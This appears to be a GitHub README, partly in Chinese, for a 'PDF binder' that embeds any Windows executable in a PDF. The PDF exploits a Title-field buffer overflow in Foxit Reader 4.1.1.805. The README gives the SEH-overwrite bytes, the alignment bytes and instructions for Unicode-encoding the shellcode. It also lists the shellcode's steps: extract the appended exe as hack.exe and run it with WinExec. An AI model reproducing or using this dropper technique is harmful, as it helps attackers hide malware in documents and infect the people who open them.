PDF_Binder
==========

PDF_Binder(foxit reader4.1.1 exploit)
PDF捆绑器，可捆绑win平台下的任何可执行程序。</br>
漏洞描述：如果PDF文件的Title字段过长，Foxit Reader 4.1.1.805在读取Title字段时会发生缓冲区溢出。</br>
原因：Title字段过长，Foxit Reader 4.1.1.805调用lstrcpyW函数的时候会发生缓冲区溢出从而覆盖掉SEH。</br>
##Unicode-friendly SEH exploit：
nSeh  = "\x5A\x41" #0041005A are harmless instrs(venetian shellcode). </br>
seh   = "\x46\x6A" #006A0046 the addrs point to p/p/r instrs and it is harmless </br>
align = "\x41\x61\x5C\x5C\x41\x61\x41\x54\x41\xC3" # Align  finally make eip point to shellcode </br>
###Control flow
![control flow](https://github.com/cnStevenYu/PDF_Binder/blob/master/Binder/Resources/pdf%20exploit.png?raw=true)
###Debug 
![seh](https://github.com/cnStevenYu/PDF_Binder/blob/master/Binder/Resources/seh.png?raw=true)
![nSeh](https://github.com/cnStevenYu/PDF_Binder/blob/master/Binder/Resources/nSeh.png?raw=true)
##shellcode
shellcode must be encoded to be unicode-compatible. </br>
use alpha2 -unicode to create unicode-compatibe shellcode.</br>
###shellcode的功能
1.通过GetCommandLine()获取文件名 </br>
2.打开pdf文件，读取最后8字节数据，取出exe的偏移值 </br>
3.读写文件，将附加在pdf文件后面的exe二进制码写到另一文件中(hack.exe) </br>
4.调用WinExec执行exe </br>



